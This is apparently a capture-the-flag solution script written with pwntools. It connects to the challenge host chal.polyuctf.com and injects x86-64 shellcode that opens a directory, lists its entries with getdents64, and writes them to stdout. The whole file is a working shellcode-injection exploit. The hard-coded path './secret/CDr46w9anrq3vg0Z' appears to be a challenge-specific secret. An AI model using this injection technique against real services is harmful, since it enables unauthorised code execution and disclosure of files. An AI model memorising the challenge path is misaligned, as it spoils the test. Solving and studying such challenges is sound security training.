from pwn import *

binary = './chall'
context.binary = binary

# Change to remote if needed

p = process(binary)
p = remote("chal.polyuctf.com", 35365)
s = '''
'''

#gdb.attach(p, s)

shellcode = asm('''
    /* Open current directory using openat */
    mov rax, 257        /* syscall: openat */
    mov rdi, -100       /* dirfd: AT_FDCWD (current working directory) */
    lea rsi, [rip+dot]  /* pointer to "." (current directory) */
    xor rdx, rdx        /* flags: O_RDONLY */
    xor r10, r10        /* mode: 0 */
    syscall
    
    /* Save directory file descriptor */
    mov r12, rax
    
    /* Allocate buffer on stack for directory entries */
    sub rsp, 1024
    mov rbp, rsp        /* Save buffer address in rbp */
    
    /* Use getdents64 to list directory entries */
    mov rax, 217        /* syscall: getdents64 */
    mov rdi, r12        /* directory fd */
    mov rsi, rbp        /* buffer address */
    mov rdx, 1024       /* buffer size */
    syscall
    
    /* Save number of bytes read */
    mov r13, rax
    
    /* Write directory entries to stdout */
    mov rax, 1          /* syscall: write */
    mov rdi, 1          /* fd: stdout */
    mov rsi, rbp        /* buffer address */
    mov rdx, r13        /* number of bytes to write */
    syscall

dot:
    .string "./secret/CDr46w9anrq3vg0Z"
''')

p.sendline(shellcode)
p.interactive()
